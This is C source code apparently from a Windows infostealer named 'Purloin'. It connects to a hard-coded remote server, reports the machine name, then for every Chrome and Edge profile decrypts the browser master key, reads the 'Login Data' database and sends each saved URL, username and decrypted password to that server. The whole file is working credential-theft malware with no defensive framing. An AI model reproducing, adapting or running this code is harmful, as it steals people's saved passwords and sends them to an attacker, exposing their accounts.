#include <stdio.h>
#include <stdlib.h>

#include "Purloin/includes/Purloin_Debug.h"
#include "Purloin/includes/Purloin_Server.h"
#include "Purloin/includes/Purloin_Chrome.h"

#include <windows.h>
#include <tchar.h>
#include <psapi.h>

#define ENC_MASTER_KEY_LEN 357
#define CIPHER_LEN 512
#define DEFAULT_BUFLEN 512
//#define SERVER_IP "purloin.sytes.net"
#define SERVER_IP "192.168.8.101"
#define DEFAULT_PORT "25565"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment (lib, "Wlanapi.lib")

BOOL dump_chrome(SOCKET ConnectSocket, CHAR * message, DWORD message_size);
BOOL dump_edge(SOCKET ConnectSocket, CHAR* message, DWORD message_size);

//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
int main() {

	CHAR message[DEFAULT_BUFLEN];
	SOCKET ConnectSocket = INVALID_SOCKET;

	/* Connect to the server */
	if (!connect(&ConnectSocket, SERVER_IP, DEFAULT_PORT)) {
		return FALSE;
	}

	send_machineName(ConnectSocket);

	dump_chrome(ConnectSocket, message, DEFAULT_BUFLEN);
	dump_edge(ConnectSocket, message, DEFAULT_BUFLEN);

	/* Disconnect from the server */
	close(ConnectSocket);
	return 0;
}

BOOL dump_chrome(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
	/* Gets the Chrome Folder if exists, which is% LOCALAPPDATA% \Google\Chrome\User Data */
	WCHAR chrome_dir[MAX_PATH] = { L'\0' };													// Buffer to hold Google Chrome directory
	if (!get_user_dir(FOLDERID_LocalAppData, L"\\Google\\Chrome\\User Data\\", chrome_dir, message, message_size)) {
		Debug(send_data(message, ConnectSocket);)
		return FALSE;
	}

	/* Get, decrypt the MasterKey of chrome and then use it to obtain the AES-GCM decryption handler which is used to decrypt passwords */
	WCHAR enc_master_key[ENC_MASTER_KEY_LEN] = { L'\0' };
	if (!get_encrypted_masterkey(chrome_dir, L"Local State", enc_master_key, ENC_MASTER_KEY_LEN, message, message_size)) {
		Debug(send_data(message, ConnectSocket);)
		return FALSE;
	}
	BCRYPT_KEY_HANDLE handle_bcrypt;													// Handle to the decryption algorithm of AES-GCM256
	CHAR char_master_key[ENC_MASTER_KEY_LEN];											// Buffer to hold encrypted BASE64 encoded char type master key
	DATA_BLOB blob_dec_masterkey;														// DATA_BLOB to hold byte form of decrypted master key
	if (!decrypt_masterkey(enc_master_key, char_master_key, ENC_MASTER_KEY_LEN, &blob_dec_masterkey, message, message_size)) {
		Debug(send_data(message, ConnectSocket);)
		return FALSE;
	}
	if (!get_decryption_handler(&handle_bcrypt, &blob_dec_masterkey, message, message_size)) {
		Debug(send_data(message, ConnectSocket);)
		return FALSE;
	}
	/* -------------------------------------------------------------------------------------------------- */

	/* Converts the WCHAR chrome directory path to CHAR */
	size_t size_returned_char_master_key;
	errno_t err;
	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Chrome directory in CHAR, used to get profile paths to get Login Data db
	if ((err = wcstombs_s(&size_returned_char_master_key, chrome_dir_char, MAX_PATH * sizeof(CHAR), chrome_dir, (MAX_PATH - 1) * sizeof(CHAR)))) {
		Debug(sprintf_s(message, message_size * sizeof(CHAR), "wcstombs_s: Error when converting wchar master key to char master key, error: %d\n", err);)
		Debug(send_data(message, ConnectSocket);)
		return FALSE;
	}

	// Allocate a buffer to hold the decrypted password in byte form
	ULONG decrypted_credential_size = CIPHER_LEN;
	BYTE* decrypted_credential = (BYTE*)malloc(decrypted_credential_size);
	if (!decrypted_credential) {
		Debug(sprintf_s(message, message_size * sizeof(CHAR), "malloc: Error when allocating buffer for 'decrypted_credential'\n");)
		Debug(send_data(message, ConnectSocket);)
		return FALSE;
	}
	memset(decrypted_credential, 0, decrypted_credential_size);


	/* Gets a file handle for Chrome directory to list the files in that directory */
	WIN32_FIND_DATAA dir_files;																// Handle to get file/folders on Chrome_dir
	HANDLE dir_handle;																		// Handle to a directory/file
	if (!get_file_explorer(chrome_dir_char, &dir_files, &dir_handle, message, message_size)) {
		Debug(send_data(message, ConnectSocket);)
		return FALSE;
	}
	/* Go through the files/folders in that directory */
	do {
		if (checkSubtring("Default", dir_files.cFileName) || checkSubtring("Profile", dir_files.cFileName)) {	// Check if a folder starts with "Deafult" or "Profile \d?" to identify profile directories
			sprintf_s(message, message_size * sizeof(CHAR), "------------------------ %s ---------------------\n", dir_files.cFileName);
			Debug(send_data(message, ConnectSocket);)

			/* Append LoginData database path for each profile */
			errno_t err;
			CHAR logindata_path[MAX_PATH] = "\0";
			if ((err = strcat_s(logindata_path, MAX_PATH, chrome_dir_char)) != 0) {											// Apend '\\' to the end of chrome_dir_char to make the path for Login Data file for a specific user profile
				Debug(sprintf_s(message, message_size * sizeof(CHAR), "strcat_s: Appending chrome_dir_char to logindata_path error: %d\n", err);)
				return FALSE;
			}
			if ((err = strcat_s(logindata_path, MAX_PATH, dir_files.cFileName)) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
				Debug(sprintf_s(message, message_size * sizeof(CHAR), "strcat_s: Appending '%s' to logindata_path error: %d\n", dir_files.cFileName, err);)
				return FALSE;
			}
			if ((err = strcat_s(logindata_path, MAX_PATH, "\\Login Data")) != 0) {									// Append '\Login Data' to end of chrome_dir_char
				Debug(sprintf_s(message, message_size * sizeof(CHAR), "strcat_s: Appending 'Login Data' to logindata_path error: %d\n", err);)
				return FALSE;
			}

			/* Open database connection */
			void* handle_db;																		// Handle to SQLite Database handle
			BOOL database_con_status = open_database(logindata_path, &handle_db, message, message_size, FALSE);
			if (!database_con_status) {
				Debug(send_data(message, ConnectSocket);)
				continue;
			}

			/* Create a SQL statement to be executed */
			void* handle_sql_stmt = NULL;															// Handle to SQLite Query Statement
			BOOL sql_status = prepare_sql(handle_db, &handle_sql_stmt, "SELECT origin_url,username_value,password_value FROM logins", message, message_size);
			if (sql_status == DATABASE_BUSY) {
				if (!close_database(handle_db, handle_sql_stmt, message, message_size)) {
					Debug(sprintf_s(message, message_size * sizeof(CHAR), "Database reset error\n");)
					Debug(send_data(message, ConnectSocket);)
					continue;
				}
				database_con_status = open_database(logindata_path, &handle_db, message, message_size, TRUE);
				if (!database_con_status) {
					Debug(send_data(message, ConnectSocket);)
					continue;
				}
				if ((sql_status = prepare_sql(handle_db, &handle_sql_stmt, "SELECT origin_url,username_value,password_value FROM logins", message, message_size)) != 0) {
					Debug(send_data(message, ConnectSocket);)
					continue;
				}
			}

			/* Ietrate over results one by one */
			int status = 0;
			while (iterate_result(handle_sql_stmt)) {

				/* Get and send url and username */
				sprintf_s(message, message_size * sizeof(CHAR), "URL: %s\nUsername: %s\n", (char*)get_result(handle_sql_stmt, 0, TEXT_RESULT), (char*)get_result(handle_sql_stmt, 1, TEXT_RESULT));
				send_data(message, ConnectSocket);

				/* Get, Decrypt, and send the password */
				BYTE* data_blob = (BYTE*)get_result(handle_sql_stmt, 2, BYTE_RESULT);
				int data_blob_size = get_result_size(handle_sql_stmt, 2);
				if (aesgcm_decrypt(handle_bcrypt, 3, data_blob + 3 + 12, &data_blob_size, data_blob + 3, 12, data_blob + (data_blob_size - 16), 16, &decrypted_credential, &decrypted_credential_size)) {
					sprintf_s(message, message_size * sizeof(CHAR), "Password: %s\n\n", decrypted_credential);
					send_data(message, ConnectSocket);
				}
				else {
					Debug(sprintf_s(message, message_size * sizeof(CHAR), "Decryption error\n");)
					Debug(send_data(message, ConnectSocket);)
					continue;
				}
				memset(decrypted_credential, 0, decrypted_credential_size);
			}

			if (!close_database(handle_db, handle_sql_stmt, message, message_size)) {
				Debug(sprintf_s(message, message_size * sizeof(CHAR), "Database reset error\n");)
				Debug(send_data(message, ConnectSocket);)
			}

		}
	} while (FindNextFileA(dir_handle, &dir_files));

	/* Free allocated memory to prevent leaks */
	free(decrypted_credential);
}

BOOL dump_edge(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
	/* Gets the Chrome Folder if exists, which is% LOCALAPPDATA% \Google\Chrome\User Data */
	WCHAR edge_dir[MAX_PATH] = { L'\0' };													// Buffer to hold Google Chrome directory
	if (!get_user_dir(FOLDERID_LocalAppData, L"\\Microsoft\\Edge\\User Data\\", edge_dir, message, message_size)) {
		Debug(send_data(message, ConnectSocket);)
			return FALSE;
	}

	/* Get, decrypt the MasterKey of chrome and then use it to obtain the AES-GCM decryption handler which is used to decrypt passwords */
	WCHAR enc_master_key[ENC_MASTER_KEY_LEN] = { L'\0' };
	if (!get_encrypted_masterkey(edge_dir, L"Local State", enc_master_key, ENC_MASTER_KEY_LEN, message, message_size)) {
		Debug(send_data(message, ConnectSocket);)
			return FALSE;
	}
	BCRYPT_KEY_HANDLE handle_bcrypt;													// Handle to the decryption algorithm of AES-GCM256
	CHAR char_master_key[ENC_MASTER_KEY_LEN];											// Buffer to hold encrypted BASE64 encoded char type master key
	DATA_BLOB blob_dec_masterkey;														// DATA_BLOB to hold byte form of decrypted master key
	if (!decrypt_masterkey(enc_master_key, char_master_key, ENC_MASTER_KEY_LEN, &blob_dec_masterkey, message, message_size)) {
		Debug(send_data(message, ConnectSocket);)
			return FALSE;
	}
	if (!get_decryption_handler(&handle_bcrypt, &blob_dec_masterkey, message, message_size)) {
		Debug(send_data(message, ConnectSocket);)
			return FALSE;
	}
	/* -------------------------------------------------------------------------------------------------- */

	/* Converts the WCHAR chrome directory path to CHAR */
	size_t size_returned_char_master_key;
	errno_t err;
	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Chrome directory in CHAR, used to get profile paths to get Login Data db
	if ((err = wcstombs_s(&size_returned_char_master_key, chrome_dir_char, MAX_PATH * sizeof(CHAR), edge_dir, (MAX_PATH - 1) * sizeof(CHAR)))) {
		Debug(sprintf_s(message, message_size * sizeof(CHAR), "wcstombs_s: Error when converting wchar master key to char master key, error: %d\n", err);)
			Debug(send_data(message, ConnectSocket);)
			return FALSE;
	}

	// Allocate a buffer to hold the decrypted password in byte form
	ULONG decrypted_credential_size = CIPHER_LEN;
	BYTE* decrypted_credential = (BYTE*)malloc(decrypted_credential_size);
	if (!decrypted_credential) {
		Debug(sprintf_s(message, message_size * sizeof(CHAR), "malloc: Error when allocating buffer for 'decrypted_credential'\n");)
			Debug(send_data(message, ConnectSocket);)
			return FALSE;
	}
	memset(decrypted_credential, 0, decrypted_credential_size);


	/* Gets a file handle for Chrome directory to list the files in that directory */
	WIN32_FIND_DATAA dir_files;																// Handle to get file/folders on Chrome_dir
	HANDLE dir_handle;																		// Handle to a directory/file
	if (!get_file_explorer(chrome_dir_char, &dir_files, &dir_handle, message, message_size)) {
		Debug(send_data(message, ConnectSocket);)
			return FALSE;
	}
	/* Go through the files/folders in that directory */
	do {
		if (checkSubtring("Default", dir_files.cFileName) || checkSubtring("Profile", dir_files.cFileName)) {	// Check if a folder starts with "Deafult" or "Profile \d?" to identify profile directories
			sprintf_s(message, message_size * sizeof(CHAR), "------------------------ %s ---------------------\n", dir_files.cFileName);
			Debug(send_data(message, ConnectSocket);)

				/* Append LoginData database path for each profile */
				errno_t err;
			CHAR logindata_path[MAX_PATH] = "\0";
			if ((err = strcat_s(logindata_path, MAX_PATH, chrome_dir_char)) != 0) {											// Apend '\\' to the end of chrome_dir_char to make the path for Login Data file for a specific user profile
				Debug(sprintf_s(message, message_size * sizeof(CHAR), "strcat_s: Appending chrome_dir_char to logindata_path error: %d\n", err);)
					return FALSE;
			}
			if ((err = strcat_s(logindata_path, MAX_PATH, dir_files.cFileName)) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
				Debug(sprintf_s(message, message_size * sizeof(CHAR), "strcat_s: Appending '%s' to logindata_path error: %d\n", dir_files.cFileName, err);)
					return FALSE;
			}
			if ((err = strcat_s(logindata_path, MAX_PATH, "\\Login Data")) != 0) {									// Append '\Login Data' to end of chrome_dir_char
				Debug(sprintf_s(message, message_size * sizeof(CHAR), "strcat_s: Appending 'Login Data' to logindata_path error: %d\n", err);)
					return FALSE;
			}

			/* Open database connection */
			void* handle_db;																		// Handle to SQLite Database handle
			BOOL database_con_status = open_database(logindata_path, &handle_db, message, message_size, FALSE);
			if (!database_con_status) {
				Debug(send_data(message, ConnectSocket);)
				continue;
			}

			/* Create a SQL statement to be executed */
			void* handle_sql_stmt = NULL;															// Handle to SQLite Query Statement
			BOOL sql_status = prepare_sql(handle_db, &handle_sql_stmt, "SELECT origin_url,username_value,password_value FROM logins", message, message_size);
			if (sql_status == DATABASE_BUSY) {
				if (!close_database(handle_db, handle_sql_stmt, message, message_size)) {
					Debug(sprintf_s(message, message_size * sizeof(CHAR), "Database reset error\n");)
						Debug(send_data(message, ConnectSocket);)
						continue;
				}
				database_con_status = open_database(logindata_path, &handle_db, message, message_size, TRUE);
				if (!database_con_status) {
					Debug(send_data(message, ConnectSocket);)
						continue;
				}
				if ((sql_status = prepare_sql(handle_db, &handle_sql_stmt, "SELECT origin_url,username_value,password_value FROM logins", message, message_size)) != 0) {
					Debug(send_data(message, ConnectSocket);)
						continue;
				}
			}

			/* Ietrate over results one by one */
			int status = 0;
			while (iterate_result(handle_sql_stmt)) {

				/* Get and send url and username */
				sprintf_s(message, message_size * sizeof(CHAR), "URL: %s\nUsername: %s\n", (char*)get_result(handle_sql_stmt, 0, TEXT_RESULT), (char*)get_result(handle_sql_stmt, 1, TEXT_RESULT));
				send_data(message, ConnectSocket);

				/* Get, Decrypt, and send the password */
				BYTE* data_blob = (BYTE*)get_result(handle_sql_stmt, 2, BYTE_RESULT);
				int data_blob_size = get_result_size(handle_sql_stmt, 2);
				if (aesgcm_decrypt(handle_bcrypt, 3, data_blob + 3 + 12, &data_blob_size, data_blob + 3, 12, data_blob + (data_blob_size - 16), 16, &decrypted_credential, &decrypted_credential_size)) {
					sprintf_s(message, message_size * sizeof(CHAR), "Password: %s\n\n", decrypted_credential);
					send_data(message, ConnectSocket);
				}
				else {
					Debug(sprintf_s(message, message_size * sizeof(CHAR), "Decryption error\n");)
					Debug(send_data(message, ConnectSocket);)
					continue;
				}
				memset(decrypted_credential, 0, decrypted_credential_size);
			}

			if (!close_database(handle_db, handle_sql_stmt, message, message_size)) {
				Debug(sprintf_s(message, message_size * sizeof(CHAR), "Database reset error\n");)
				Debug(send_data(message, ConnectSocket);)
			}

		}
	} while (FindNextFileA(dir_handle, &dir_files));

	/* Free allocated memory to prevent leaks */
	free(decrypted_credential);
}